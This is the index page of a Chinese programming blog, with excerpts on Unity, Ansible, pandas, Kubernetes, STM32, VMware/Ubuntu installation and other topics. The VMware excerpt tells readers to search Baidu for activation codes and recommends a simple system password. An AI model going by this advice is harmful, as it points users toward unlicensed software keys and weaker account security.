<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa93c69a0d9d86e0275657536e4e1d34/" rel="bookmark">
			Unity Poisson分布 【由ChatGPT生成】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity Poisson分布 【由ChatGPT生成】 前言项目Unity场景布置代码编写添加并设置脚本运行效果总结 前言 在Unity游戏开发中，数学和统计学的概念常常用于解决各种问题，从资源分配到游戏机制的设计。本文将探讨Poisson分布在Unity游戏开发中的实际应用和作用。
项目 考虑一个多人在线射击游戏的场景布置。玩家需要在虚拟世界中收集道具，而这些道具会在一定时间内重新生成。
Unity场景布置 为了实现道具的重新生成，我们可以利用Poisson分布来模拟玩家收集道具的情况。Poisson分布在事件在固定时间间隔内发生的次数上具有广泛应用。我们可以根据Poisson分布的概率密度函数来计算在一定时间内生成道具的数量，从而实现道具的自动刷新。
代码编写 using UnityEngine; public class ItemSpawnManager : MonoBehaviour { public float spawnRate = 1.0f; // 平均每秒生成的道具数量 private float timeSinceLastSpawn = 0.0f; private void Update() { // 使用Poisson分布计算生成道具的数量 int itemsToSpawn = PoissonDistribution(spawnRate * Time.deltaTime); for (int i = 0; i &lt; itemsToSpawn; i++) { SpawnItem(); } timeSinceLastSpawn += Time.deltaTime; } // 根据Poisson分布生成随机数 private int PoissonDistribution(float lambda) { float L = Mathf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa93c69a0d9d86e0275657536e4e1d34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7145f69455f9dd58b94488aa77efd97c/" rel="bookmark">
			用普通用户sudo执行ansibe命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、编辑/etc/ansible/ansible.cfg
2、hosts文件
3、执行命令 必须加-b选项
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6b8137fdbb55ee65208db4ef204a7d6/" rel="bookmark">
			ALS-PT19-315C/L177/TR8环境光传感器简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述：
ALS-PT19-315C/L177/TR8是一款低成本的环境光传感器，由微型SMD中的光电晶体管组成。EVERLIGHT ALS系列产品是手机、NB、pda等移动设备显示背光节电的有效解决方案。由于红外辐射的高抑制比，环境光传感器的光谱响应接近人眼的光谱响应。
二、主要特性：
● 接近人眼光谱的
● 光转电流，模拟输出
● 良好的输出线性度，照明范围广
● 不同光源之间的低灵敏度变化
● 温度性能保证，-40℃至85℃
● 宽供电电压范围，2.5V至5.5V
● 尺寸:1.7mm(L)*0.8mm(W)*0.6mm(H)
三、特性曲线：
四、典型应用：
五、Proteus仿真原理图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8636a505c92eba773dfc6e8dfff924cd/" rel="bookmark">
			CorelDRAW(CDR) 2023中文版64位下载新功能教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CorelDRAW2023（简称CDR2023）是一款非常专业的图形设计工具，该产品推出了全新的2023版本，在功能和体验上更进一步，最新的填充和透明设备功能可以完全控制任何类型的纹理，适用于网络摄影、印刷项目、艺术、排版等，让你可以更好的进行图像设计图形设计软件。
PS：本次除了提供CorelDRAW2023主程序外，还带来了完整的CorelDRAW 2023 Extras Content（额外内容），欢迎需要此款工具的朋友前来下载使用。
CorelDRAW Graphics Suite 2023 新增功能 1、新增功能！在线模板
在CorelDRAW中，您现在可以在创建新文档对话框的模板选项卡上使用在线模板开始项目。有关详细信息，请参阅从模板开始创建文档.通过使用新的在线库，您可以即时访问比以往更多的模板。完成您的个人资料调查，这样您就可以筛选模板并显示最适合您的模板。
2、增强功能！实践项目建议
您现在可以在个人资料调查的最后一页访问与您的技能水平、需求和兴趣相匹配的实践项目。有关详细信息，请参阅实践项目.
3、增强功能！文档创建控制
现在，您可以在创建新文档对话框的文档设置选项卡上设置出血限制。此设置将与文档的预设一起保存，并在CorelDRAW中创建新文档时提供更大的灵活性。有关详细信息，请参阅开始绘制和打开绘图.
4、增强功能！文档预设缩略图
改进了创建新文档对话框中预设的缩略图，因此支持更轻松地查看和浏览应用程序中可用的各种打印、Web、设备特定和社交媒体预设。页面尺寸信息已被简化以减少视觉混乱。现在，图标可以更好地指示页面类型，并可以帮助您快速找到所需的确切预设。
5、增强功能！崩溃报告
如果CorelDRAW Graphics Suite中的应用程序意外退出，下次启动该应用程序时会出现一个错误报告对话框。现在，如果您不想发送错误报告，您可以在全局隐私设置中禁用崩溃报告对话框。有关详细信息，请参阅错误记录和报告.
6、新增功能！可变轮廓工具
可变轮廓可让您在CorelDRAW中创建不同宽度的对象轮廓。您可以指定宽度变化开始和结束的位置，以创建动态、栩栩如生的线条和形状。此外，您还可以在不影响其可变轮廓属性的情况下修改轮廓。有关详细信息，请参阅可变轮廓.
CorelDRAW Graphics Suite 2023功能特色 1、合并打印
CorelDRAW 2023 更新了将绘图与可变文本片段合并的方式，从而产生多种不同的设计副本。凭借全面修正的 UI 和简化的工作流，通过”合并打印”功能可更轻松地将图形与数据源合并，以快速生成个性化批量邮件、目标市场营销作品、名片、证书等。
2、字体识别
CorelDRAW Graphics Suite 2023 提供与来自 MyFonts.com 的在线字体识别服务 WhatTheFont 的增强集成。通过选择设计元素即可识别从客户收到的现有文件或作品中使用的字体，从而能够节省时间。
3、数码资产管理
用户与设计资产的交互方式在 CorelDRAW Graphics Suite 2023 中进行了全面修正。在使用图像、剪贴画、填充、模板、字体等时，完全重新设计的 UI 有助于促进工作效率和提高性能。通过简化的 UI，您可以前所未有的速度使用、创建和查找相应的内容。您可以下载新包，添加您自己的库，轻松将资产集合迁移到任意位置，以及修改资产属性 – 此套件囊括了所有功能。此外，新的”CONNECT 内容”泊坞窗提供一个集中位置，您可以在此搜索并浏览矢量和光栅图像以及访问更多图形。
4、性能
得益于性能增强功能，您可以前所未有的速度进行工作。
5、像素完美工作流
CorelDRAW 2023 利用一系列可确保像素完美精确度的新功能，毫无疑问能够为 Web 创建整洁清晰的图像。有关详细信息，请参阅为 Web 创建像素完美图形
6、PDF/X 支持
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8636a505c92eba773dfc6e8dfff924cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0661a2f2e4314c6c535fb576768e626/" rel="bookmark">
			创建型模式-原型模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、原型模式1. 概述2. 结构3. 实现4. 案例1.5 使用场景1.6 扩展（深克隆） 一、原型模式 1. 概述 用一个已经创建的实例作为原型，通过复制该原型对象来创建一个和原型对象相同的新对象。
2. 结构 原型模式包含如下角色：
抽象原型类：规定了具体原型对象必须实现的 clone() 方法。具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象。访问类：使用具体原型类中的 clone() 方法来复制新的对象。 接口类图如下：
3. 实现 原型模式的克隆分为浅克隆和深克隆。
浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。
深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。
Java中的Object类中提供了 clone() 方法来实现浅克隆。 Cloneable 接口是上面的类图中的抽象原型类，而实现了Cloneable接口的子实现类就是具体的原型类。
Realizetype（具体的原型类）：
public class Realizetype implements Cloneable { public Realizetype() { System.out.println("具体的原型对象创建完成！"); } @Override public Realizetype clone() throws CloneNotSupportedException { System.out.println("具体原型复制成功！"); return (Realizetype) super.clone(); } } PrototypeTest（测试访问类）：
public class PrototypeTest { public static void main(String[] args) throws CloneNotSupportedException { //创建一个原型类对象 Realizetype realizetype = new Realizetype(); //调用Realizetype类中的clone方法进行对象的克隆 Realizetype clone = realizetype.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0661a2f2e4314c6c535fb576768e626/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/298404c83af01a97d10fce9b35ce7241/" rel="bookmark">
			echarts 图表设置 滚动条
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图： 代码实现： 第一种方式： 通过 dataZoom 属性缩放进行配置滚动条。
//给x轴设置滚动条 dataZoom: [{ start:0,//默认为0 end: 100-1500/31,//默认为100 type: 'slider', show: true, xAxisIndex: [0], handleSize: 0,//滑动条的 左右2个滑动条的大小 height: 10,//组件高度 left: '10%', //左边的距离 right: '10%',//右边的距离 bottom: 26,//右边的距离 borderColor: "#000", fillerColor: '#269cdb', borderRadius:5, backgroundColor: '#33384b',//两边未选中的滑动条区域的颜色 showDataShadow: false,//是否显示数据阴影 默认auto showDetail: false,//即拖拽时候是否显示详细数值信息 默认true realtime:true, //是否实时更新 filterMode: 'filter', }, //1.横向使用滚动条 { type: 'slider',//有单独的滑动条，用户在滑动条上进行缩放或漫游。inside是直接可以是在内部拖动显示 show: true,//是否显示 组件。如果设置为 false，不会显示，但是数据过滤的功能还存在。 start: 0,//数据窗口范围的起始百分比0-100 end: 50,//数据窗口范围的结束百分比0-100 xAxisIndex: [0],// 此处表示控制第一个xAxis，设置 dataZoom-slider 组件控制的 x轴 可是已数组[0,2]表示控制第一，三个；xAxisIndex: 2 ，表示控制第二个。yAxisIndex属性同理 bottom:-10 //距离底部的距离 }, //2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/298404c83af01a97d10fce9b35ce7241/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9daa8de85c7cc6538b0944f46465a2e9/" rel="bookmark">
			pandas 基础用法大全（入门首选）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转载于：pandas用法大全，并在原文的基础上修复了部分问题并配了相应代码执行输出的结果。
另一篇加强练习篇：[pandas 百题大冲关](pandas 百题大冲关_ystraw_ah的博客-CSDN博客)
目录
概念梳理
一、生成数据表
三、数据表清洗
四、数据预处理
五、数据提取
六、数据筛选
七、数据汇总
八、数据统计‘
九、数据输出
概念梳理： Pandas 的数据类型主要有以下几种，它们分别是：Series（一维数组），DataFrame（二维数组），Panel（三维数组），Panel4D（四维数组），PanelND（更多维数组）。其中 Series 和 DataFrame 应用的最为广泛，几乎占据了使用频率 90% 以上。
Series 是 Pandas 中最基本的一维数组形式。其可以储存整数、浮点数、字符串等类型的数据。Series 基本结构如下：
pandas.Series(data=None, index=None) 其中，data 可以是字典，或者NumPy 里的 ndarray 对象等。index 是数据索引，索引是 Pandas 数据结构中的一大特性，它主要的功能是帮助我们更快速地定位数据。
import pandas as pd s = pd.Series({'a': 10, 'b': 20, 'c': 30}) s DataFrame 是 Pandas 中最为常见、最重要且使用频率最高的数据结构。DataFrame 和平常的电子表格或 SQL 表结构相似。你可以把 DataFrame 看成是 Series 的扩展类型，它仿佛是由多个 Series 拼合而成。它和 Series 的直观区别在于，数据不但具有行索引，且具有列索引。
DataFrame 基本结构如下：
pandas.DataFrame(data=None, index=None, columns=None) 区别于 Series，其增加了 columns 列索引。DataFrame 可以由以下多个类型的数据构建：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9daa8de85c7cc6538b0944f46465a2e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd375700c69b6ddad5cac8525c617213/" rel="bookmark">
			AxMath使用教程&#43;常用符号与公式（持续更新中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 这两天学了学Latex，主要是为了以后写毕业论文做铺垫，而且Latex在数学公式这一方面，要比Word方便许多，于是我就下载了一款国产的公式编辑器——AxMath。永久会员不贵，只要36元，而且软件很好用，我选择支持国产。因为我是学通信的，可能整理的一些通信相关的公式和符号较多。
文章目录 前言面板介绍输入公式渲染基本运算符号分数根号上划线与下划线等式关系换行与空格常用三角函数括号绝对值微分与积分求和与累乘极限计算时等号对齐希腊字母举个例子 面板介绍 我感觉常用的其实就这俩功能，如果熟练起来的话，基本不需要鼠标操作。没学这些之前一直有一个误区就是觉得Latex要会写代码，其实学了之后才发现，基本不需要自己写，套模板和复制就足够了。
点击Latex代码转换
这个好处就是可以根据上面写的公式来学习代码是怎么写的
输入公式 渲染 两个$中间夹起来表示渲染Latex
$$ 要渲染的内容 $$ 基本运算符号 名称AxMath渲染后加+ + + +减- − - −乘\cdot ⋅ \cdot ⋅除\div ÷ \div ÷正负\pm ± \pm ± \cdot表示点乘,一般不写 *作为乘号
分数 普通输入AxMath渲染后1/2\frac{1}{2} 1 2 \frac{1}{2} 21​ 解读：\frac{分子}{分母} 根号 名称AxMath渲染后根号\sqrt{2} 2 \sqrt{2} 2 ​多次根号\sqrt[3]{2} 2 3 \sqrt[3]{2} 32 ​ 解读： \sqrt{被开方数} \sqrt[开几次根]{被开方数} 上划线与下划线 名称AxMath渲染后上划线\overline{a} a ‾ \overline{a} a下划线\underline{a} a ‾ \underline{a} a​ 等式关系 名称AxMath渲染后等于= = = =不等于\ne ≠ \ne =约等于\approx ≈ \approx ≈小于&lt; &lt; &lt; &lt;大于&gt; &gt; &gt; &gt;小于等于\leqslant ⩽ \leqslant ⩽大于等于\geqslant ⩾ \geqslant ⩾ 换行与空格 普通输入AxMath渲染后\\(双反斜杠)\frac{1}{2} \\ \frac{1}{2} 1 2 1 2 \frac{1}{2} \\ \frac{1}{2} 21​21​~(波浪线)\frac{1}{2} ~~~~ \frac{1}{2} 1 2 1 2 \frac{1}{2} ~~~~ \frac{1}{2} 21​ 21​ 常用三角函数 普通输入AxMath渲染后sinsin sin ⁡ \sin sincoscos cos ⁡ \cos costansin tan ⁡ \tan tanarcsinarcsin a r c sin ⁡ \mathrm{arc}\sin arcsinarccosarccos a r c cos ⁡ \mathrm{arc}\cos arccosarctanarctan a r c tan ⁡ \mathrm{arc}\tan arctansecsec sec ⁡ \sec seccotcot cot ⁡ \cot cotcsccsc csc ⁡ \csc csc 括号 名称AxMath渲染后小括号() ( ) () ()中括号[] [ ] [] []大括号{} { } \left\{ \right\} {}多行小括号\left( \begin{array}{c}1\2\3\\end{array} \right) ( 1 2 3 ) \left( \begin{array}{c}1\\2\\3\\\end{array} \right) ​123​ ​多行中括号\left[ \begin{array}{c}1\2\3\\end{array} \right] [ 1 2 3 ] \left[ \begin{array}{c}1\\2\\3\\\end{array} \right] ​123​ ​多行大括号\left{ \begin{array}{c}1\2\3\\end{array} \right} { 1 2 3 } \left\{ \begin{array}{c}1\\2\\3\\\end{array} \right\} ⎩ ⎨ ⎧​123​⎭ ⎬ ⎫​ 解读： \begin{array}{c}，array指一个矩阵，c指一列 绝对值 名称AxMath渲染后绝对值\mid a \mid ∣ a ∣ \mid a \mid ∣a∣ 微分与积分 名称AxMath渲染后微分\frac{\mathrm{d}y}{\mathrm{d}x} d y d x \frac{\mathrm{d}y}{\mathrm{d}x} dxdy​积分\int_b^a{f\left( x \right) \mathrm{d}x} ∫ b a f ( x ) d x \int_b^a{f\left( x \right) \mathrm{d}x} ∫ba​f(x)dxf’(x)f\prime\left( x \right) f ′ ( x ) f\prime\left( x \right) f′(x) 解读：\mathrm{要变成正体的字母} int_积分区间开始^积分区间结束{被积内容} f\left( x \right)表示f(x),\left和\right表示左小括号和右小括号 求和与累乘 名称AxMath渲染后求和\sum_{n=1}^{\infty}{f\left( x \right)} ∑ n = 1 ∞ f ( x ) \sum_{n=1}^{\infty}{f\left( x \right)} n=1∑∞​f(x)累乘\prod_{n=1}^{\infty}{f\left( x \right)} ∏ n = 1 ∞ f ( x ) \prod_{n=1}^{\infty}{f\left( x \right)} n=1∏∞​f(x) 解读： \sum{开始求和}^{结束求和}{函数} \prod_{开始累乘}^{结束累乘}{函数} 极限 名称AxMath渲染后求极限\lim_{x \to 0} lim ⁡ x → 0 \lim_{x \to 0} x→0lim​ 解读： \lim_{x \to 0}x趋于0 计算时等号对齐 每个等号前面加上&amp; 空格
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd375700c69b6ddad5cac8525c617213/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87183d8ec01371f455401396d92d52e8/" rel="bookmark">
			Linux虚拟机win10安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.虚拟机安装包下载
二.虚拟机配置
三.Linux系统Ubuntu镜像文件下载
四.Linux系统配置
五.写在最后
一.虚拟机安装包下载 1.选择安装VMware Workstation，登录其官网下载安装包，链接如下：
下载 VMware Workstation Pro | CN
2.双击安装包进行安装
3.默认是安装在C盘，我们自定义安装路径 4.一直点下一步进行安装
5.最后一步点击许可证输入激活码可永久使用，激活码自行百度
如果没有激活成功，则百度其他激活码
6.双击桌面VMware打开软件，点击帮助-&gt;关于查看是否永久激活
二.虚拟机配置 1.在主界面中，选择【创建新的虚拟机】
2.在弹出的【新建虚拟向导】，选择【自定义（高级）】后，点击【下一步】
3.选择默认值即可，点击【下一步】
4.选择【稍后安装操作系统】，点击【下一步】
5.选择【Linux】，其下方版本将默认更改为【Ubuntu】
6.填写【虚拟机名称】及【位置】，点击【下一步】。【虚拟机名称】即虚拟机的名字。【位置】可以选择容量较大的硬盘位置
7.【处理器数量】与【每个处理器的内核数量】选择2后，点击【下一步】
8. 选择【此虚拟机的内存】，此值应依据电脑本身情况酌情调整。常用值为1G（1024MB）、2G（2048MB）、4G（4096MB）等等。在这里选择4G
9.选择【使用网络地址转换】，点击【下一步】
10.选择推荐的【LSI Logic】即可，点击【下一步】
11.选择推荐的【SCSI】即可，点击【下一步】
12.选择【创建新虚拟磁盘】，点击【下一步】
13.设置【最大磁盘大小】为40，并选择【将虚拟磁盘拆分成多个文件】后，点击【下一步】。最大磁盘大小默认为20GB，磁盘剩余空间较大的话该数值可以往上加
14.点击【下一步】
15.点击【完成】
三.Linux系统Ubuntu镜像文件下载 linux分为3类：1、Redhat系，主要有Redhat、Centos、Fedora等，其中Centos系统是很多服务器用户选择的系统；2、Debian系，主要有Debian、Ubuntu、Mint等，这个系还有其他一些衍生版本的系统；3、其他系统，例如Gentoo、Arch Linux、LFS等。
用于开发的，大多使用Redhat系，其中Centos系统是很多企业服务器使用的系统。
相对简单的开发，则可以选择Debian系，优选Ubuntu和mint这两种版本。
还有一部分技术相对比较成熟的用户，会选择其他系别中的Gentoo、LFS，Slackware等
可以采用官网、阿里云镜像、清华镜像等。安装以iso为结尾的镜像
oldubuntu-releases-releases-16.04.1安装包下载_开源镜像站-阿里云
四.Linux系统配置 1.VMware Station界面，单机界面左侧【编辑虚拟机位置】
2.点击左侧的CD/DVD选项卡，右侧点击【使用ISO映像文件】，找到下载的Ubuntu镜像即可，点击【下一步】
3.回到VMware Station界面，点击【开启此虚拟机】
4.此时可以看到虚拟机画面，点击右侧【Install Ubuntu】
5.选择【Download updates while installing Ubuntu】,点击【continue】
6.选择【Erase disk and install Ubuntu】，点击【Install Now】
7.点击地图上【中国】的位置，会默认出现Shanghai，点击【Continue】
8.我们使用美国键盘布局【English（US）】，点击【Continue】
9.输入【Your name】【Your computer's name】【Pick a username】【Choose a password】【Confirm your password】后，点击【Continue】。这里建议密码设置的简单一些，因为Ubuntu后续很多操作需要验证密码，设置复杂的密码后期会比较麻烦
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87183d8ec01371f455401396d92d52e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/837b4c1da92371ecb0c3f8fcef944643/" rel="bookmark">
			大模型-模型文件下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工具：git lfs
直接使用git lfs clone 速度很慢，先把文件用普通方式拉下来，再去git lfs pull对应的大文件
// Skip smudge - We’ll download binary files later in a faster batch
git lfs install --skip-smudge
// Do git clone here
git clone …
// Fetch all the binary files in the new clone
git lfs pull
// Reinstate smudge
git lfs install --force
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9603765322d371aefda89563b30e10d5/" rel="bookmark">
			【K8S 的二进制搭建】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、二进制搭建 Kubernetes v1.201、准备环境 二、操作系统初始化配置三、部署 etcd 集群1、准备签发证书环境2、在 master01 节点上操作1、生成Etcd证书 3、在 node01 节点上操作4、在 node02 节点上操作 四、部署 Master 组件五、部署 docker引擎六、部署 Worker Node 组件1、在所有 node 节点上操作1、在 master01 节点上操作 2、在 node01 节点上操作3、在 master01 节点上操作，通过 CSR 请求4、在 node01 节点上操作5、自动批准CSR请求 七、部署 CNI 网络组件1、在 node01 节点上操作2、在node2节点上进行操作3、在 master01 节点上操作 八、部署 CoreDNS1、在所有 node 节点上操作2、在 master01 节点上操作3、master02 节点部署4、负载均衡部署1、修改nginx配置文件，配置四层反向代理负载均衡，指定k8s群集2台master的节点ip和6443端口2、在 master01 节点上操作 九、部署 Dashboard1、在 master01 节点上操作 一、二进制搭建 Kubernetes v1.20 1、准备环境 k8s集群master01：192.168.102.10	kube-apiserver kube-controller-manager kube-scheduler etcd k8s集群master02：192.168.102.20 k8s集群node01：192.168.102.30	kubelet kube-proxy docker k8s集群node02：192.168.102.40 etcd集群节点1：192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9603765322d371aefda89563b30e10d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/763e3117056a1930c89a2b92263b0ebd/" rel="bookmark">
			【转载修正】STM32-HAL库-printf函数重定向（USART应用实例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了便于调试，我们可以利用printf打印出调试的信息，在STM32应用中，我们就可以利用printf函数通过串口打印信息到串口调试助手上。原文里面有一些设置没有提到，这里重新整理了一下评论区大佬的指正，发布在自己的博客里面以备不时之需。
其中，配置串口的部分直接跳过，一般用cubeMX配置USART1即可，波特率115200然后其他默认就好。
然后cubeMX要选择生成单独的文件，这样才会有usart.c。
1、引入printf重定向代码块 下面直接贴需要在usart.c中添加的代码：
/* USER CODE BEGIN 0 */ #include &lt;stdio.h&gt; #ifdef __GNUC__ #define PUTCHAR_PROTOTYPE int __io_putchar(int ch) //这里原文的在_io_putchar前面又加了一个_ ，据说可以在IAR下使用 #else #define PUTCHAR_PROTOTYPE int fputc(int ch, FILE *f) #endif /* __GNUC__*/ /****************************************************************** *@brief Retargets the C library printf function to the USART. *@param None *@retval None ******************************************************************/ PUTCHAR_PROTOTYPE { HAL_UART_Transmit(&amp;huart1, (uint8_t *)&amp;ch,1,0xFFFF); return ch; } /* USER CODE END 0 */ 2、在main.c中 测试打印 上面的步骤已经将stdio.h添加到usart.c中了，如果main.c里面没有包含usart.c的话需要再单独添加一下，将#include&lt;stdio.h&gt;直接加入main.h中，因为Cube生成文件大部分都是包含了main.h的，所以除了自建文件几乎都可以全局包含到stdio.h，而且自建文件也可以直接包含main.h。操作如下：
//main.h /* Private includes ----------------------------------------------------------*/ /* USER CODE BEGIN Includes */ #include&lt;stdio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/763e3117056a1930c89a2b92263b0ebd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/458113323828dad31a0ebc9bfa78bc9e/" rel="bookmark">
			python逢七拍手游戏代码while,逢七拍手编程用python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章给大家谈谈python逢七拍手游戏代码continue图片，以及python逢七拍手游戏代码300以内，希望对各位有所帮助，不要忘了收藏本站喔。
# 逢七拍手小游戏 """ 介绍： 逢七拍手游戏的规则是：从1开始顺序数数，数到有7，或者是7的倍数时，就拍一手。 例如：7、14、17......70...... 知识点： 1、数据类型转换 2、for 循环语句 3、if 条件语句 """ # 变量定义 s = 1 # 记录打印次数 t = 1 # 记录拼接'7'的个数 # 预先文字打印 print("包含'7'和'7'的倍数有：") # 可以尝试改变数数大的范围，例如：range(1, 200);range(1, 1000) for i in range(1, 100): # 打印'7'的倍数 if i % 7 == 0 and i != int(str(7)*t): print(i, end='\t') # 每打印10个换一行 if s % 10 == 0: print() s += 1 # 记录打印次数 # 打印包含'7'的数 for j in str(i): if j == '7': print(i, end='\t') # 每打印10个换一行 if s % 10 == 0: print() s += 1 # 记录打印次数 break # 结束循环 # 计算拼接'7'的个数 if i % 10 == 0: t = 0 for k in str(i): t += 1 运行结果：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f71acf22bccbfe1544392532f900f251/" rel="bookmark">
			轻松抓取网页内容！API助力开发者，快速数据采集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在如今这个信息爆炸的时代，人们需要从各种渠道获取数据来支持自己的业务需求。而对于开发者们来说，如何快速、准确地从互联网上抓取所需的数据也成为了一项重要的技能。而抓取网页内容 API 则是一种能够帮助开发者轻松实现数据抓取的工具。
一、什么是抓取网页内容 API？
抓取网页内容 API 是一种通过网络接口提供数据抓取服务的技术。它可以帮助开发者快速、准确地获取所需的数据，并且可以自动化地定期更新。
二、抓取网页内容 API 的优点
1.省时省力：使用抓取网页内容 API 可以省去手动编写爬虫程序的繁琐过程，大大节省了时间和精力。
2.高效准确：通过现成的 API 接口，可以轻松实现数据的高效、准确获取，并且可以自动化地定期更新。
3.可扩展性强：通过调用不同的 API 接口，可以轻松实现对不同类型、不同来源的数据进行抓取。
4.安全性可靠：使用正规渠道提供的 API 接口，可以避免被封禁 IP 或者被反爬虫机制拦截。
三、抓取网页内容 API 的使用场景
1.数据分析：抓取网页内容 API 可以帮助数据分析师快速获取所需的数据，并且可以自动化地定期更新，为数据分析提供更加准确、实时的支持。
2.社交媒体：通过抓取社交媒体上的数据，可以了解用户行为、趋势等信息，从而更好地进行社交媒体营销。
3.电商平台：通过抓取竞争对手的价格、销量等数据，可以更好地制定自己的营销策略，提高市场竞争力。
4.金融服务：通过抓取金融市场上的数据，可以更好地进行投资决策、风险控制等工作。
5.新闻媒体：通过抓取新闻媒体上的内容，并进行分类、分析，可以更好地了解新闻事件背后的事实和影响。
四、如何使用抓取网页内容 API？
1.查找可用的 API 接口：可以通过搜索引擎或者开发者社区查找可用的 API 接口，并选择适合自己需求的接口。
2.注册并获取 API Key：大部分的 API 接口需要注册并获取 API Key 才能使用，因此需要按照接口提供商的要求进行注册和认证。
3.调用 API 接口：通过编写程序代码或者使用现成的 SDK 包，可以轻松实现对 API 接口的调用，并获取所需的数据。
五、抓取网页内容 API 的注意事项
1.遵守法律法规：使用抓取网页内容 API 时需要遵守相关的法律法规，不得违反相关规定。
2.注意隐私保护：在抓取用户数据时，需要注意用户隐私保护问题，不得泄露用户个人信息。
3.避免过度频繁访问：为了避免被封禁 IP 或者被反爬虫机制拦截，需要避免过度频繁地访问同一网站或同一接口。
4.注意数据解析规则：对于不同网站或接口返回的数据格式可能会有所不同，需要根据具体情况进行数据解析。
六、总结
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f71acf22bccbfe1544392532f900f251/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/180ed49924f620a4834727122bc2f842/" rel="bookmark">
			【Java 开发】mac 忘记 MySQL 数据库密码后重置密码的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于有个同事的 mac mini 刚装了 MySQL ，然后忘记一开始设的密码是什么了，但是最近又要用到本地的 MySQL 数据库，网上找了一大堆方法全都没用，但又不想删了重装，最后终于被我找到了一个正确的方法，这里分享一下解决办法。
